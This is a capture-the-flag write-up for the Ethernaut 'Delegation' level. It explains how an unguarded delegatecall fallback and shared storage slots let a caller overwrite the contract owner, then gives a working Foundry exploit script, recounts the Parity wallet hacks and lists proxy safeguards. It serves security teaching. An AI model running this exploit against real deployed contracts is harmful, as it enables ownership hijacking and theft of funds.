# 06 - Delegation

## 1. Challenge Overview

- **Objective**: Claim ownership of the deployed `Delegation` contract.
- **Vulnerability Category**: Insecure `delegatecall` / Storage Collision & Context Confusion (SWC-112).

---

## 2. Contract Source Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

---

## 3. Vulnerability Analysis

### Understanding `delegatecall`

The EVM provides two main opcodes for inter-contract communication:

1. **`call`**: Contract A calls Contract B. Contract B executes its code inside **Contract B's own environment** (its own storage, balance, and with `msg.sender = Contract A`).
2. **`delegatecall`**: Contract A invokes Contract B's code, but the code executes **inside Contract A's environment**.
   - **Storage**: Reads and writes mutate **Contract A's storage slots**.
   - **Context**: `msg.sender`, `msg.value`, and `address(this)` remain Contract A's.

### Storage Layout Comparison

| Slot       | `Delegate` Contract     | `Delegation` Contract   |
| ---------- | ----------------------- | ----------------------- |
| **Slot 0** | `address public owner;` | `address public owner;` |
| **Slot 1** | _(Empty)_               | `Delegate delegate;`    |

When `pwn()` in `Delegate` executes:

```solidity
function pwn() public {
    owner = msg.sender; // Hardcoded EVM instruction: sstore(0x0, caller())
}
```

If invoked through `delegatecall` from `Delegation`:

- The EVM writes to **Slot 0 of `Delegation`**, which is `Delegation.owner`!
- `msg.sender` is the original caller (the player).

### The Attack Vector

1. `Delegation` implements a `fallback()` that forwards any unmatched `msg.data` via `delegatecall`:

   ```solidity
   fallback() external {
       (bool result,) = address(delegate).delegatecall(msg.data);
       if (result) { this; }
   }
   ```

2. When we send a transaction to `Delegation` with `msg.data = abi.encodeWithSignature("pwn()")`:
   - `Delegation` has no function named `pwn()`, so it enters `fallback()`.
   - `fallback()` delegates execution to `Delegate`.
   - `Delegate.pwn()` executes and writes our wallet address into Slot 0 of `Delegation`.
   - We become the new owner of `Delegation`.

---

## 4. Storage Reordering PoC: What If We Swapped the Variables?

What happens if the author of `Delegation` had defined the state variables in reverse order?

```solidity
contract DelegationReordered {
    Delegate public delegate; // Storage Slot 0!
    address public owner;     // Storage Slot 1!
    // ...
}
```

### Storage Collision Analysis

| Slot       | `Delegate` | `DelegationReordered` | What `pwn()` Does: `sstore(0x0, caller())`                        |
| ---------- | ---------- | --------------------- | ----------------------------------------------------------------- |
| **Slot 0** | `owner`    | **`delegate`**        | **Corrupts the `delegate` variable with the attacker's address!** |
| **Slot 1** | _(Empty)_  | **`owner`**           | **`owner` remains untouched!**                                    |

### Proof-of-Concept Test (`test/06-Delegation.t.sol`)

We proved this exact behavior in our test suite:

```text
[PASS] test_ReorderedStorageLayoutFailsToChangeOwnerAndCorruptsDelegate() (gas: 35882)
Logs:
  Reordered PoC: Owner remained: 0x0Ac47fEc752CEF3dfdc0f63B5b79D6d75763d026
  Reordered PoC: Delegate corrupted to: 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e
```

> [!WARNING]
>
> ### ⚠️ The Golden Rule of Proxies
>
> **Implementation contracts and proxy contracts MUST have identical storage layouts.** Never reorder, insert, or change the types of existing state variables, or you will cause a catastrophic storage collision!

---

## 5. Exploit Architecture

### Interface (`src/interfaces/IDelegation.sol`)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IDelegation {
    function owner() external view returns (address);
}
```

### Exploit Script (`script/06-Delegation.s.sol`)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {IDelegation} from "../src/interfaces/IDelegation.sol";

contract DelegationScript is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address instance = vm.envAddress("INSTANCE_ADDRESS");
        address player = vm.addr(privateKey);

        IDelegation target = IDelegation(instance);

        console2.log("--- Delegation Exploit ---");
        console2.log("Target Instance:", instance);
        console2.log("Current Owner  :", target.owner());
        console2.log("Player Address :", player);

        vm.startBroadcast(privateKey);

        // Encode function selector for pwn() -> 0xdd365b8b
        bytes memory payload = abi.encodeWithSignature("pwn()");

        // Send raw call to trigger fallback() -> delegatecall(pwn())
        (bool success,) = instance.call(payload);
        require(success, "Exploit call failed");

        vm.stopBroadcast();

        console2.log("Updated Owner  :", target.owner());
        require(target.owner() == player, "Exploit failed: owner not transferred");
        console2.log(">>> SUCCESS! Ownership taken! Submit instance in Ethernaut. <<<");
    }
}
```

---

## 6. Real-World Case Studies: The Parity Wallet Hacks (2017)

This challenge is a direct recreation of the **Parity Multi-Sig Wallet** hacks of 2017:

1. **Parity Hack #1 (July 2017 - 150,000 ETH stolen)**:
   - Parity deployed multi-sig wallets using a proxy pattern where wallets delegated calls to a shared library.
   - The shared library had an unprotected `initWallet()` function.
   - An attacker called `initWallet()` through the proxy, overwriting the wallet's owners at Slot 0 and draining \$30M+.
2. **Parity Hack #2 (November 2017 - 513,774 ETH frozen forever)**:
   - To fix Hack #1, Parity deployed a new library.
   - However, they forgot to initialize the library itself!
   - A user called `initWallet()` directly on the library contract, became its owner, and called `kill()`, self-destructing the shared implementation contract.
   - All 587 multi-sig wallets delegating to that library had their funds locked permanently (~$150M+ at the time, billions today).

---

## 7. Prevention & Secure Proxy Standards

1. **Never use open / unconstrained `delegatecall`**: Forwarding arbitrary `msg.data` via `delegatecall` without strict whitelisting allows callers to hijack storage.
2. **Adopt Battle-Tested Proxy Patterns**:
   - Use OpenZeppelin's standard proxy implementations (`ERC1967Proxy`, `TransparentUpgradeableProxy`, `UUPSUpgradeable`).
3. **Prevent Storage Collisions**:
   - Follow ERC-1967 storage slot standards (using deterministic pseudo-random storage slots like `keccak256("eip1967.proxy.implementation") - 1`).
   - Use ERC-7201 (Namespaced Storage Layouts).
4. **Lock Implementation Initializers**:
   - Always call `_disableInitializers()` in the constructor of upgradeable implementation contracts to prevent anyone from initializing them directly.
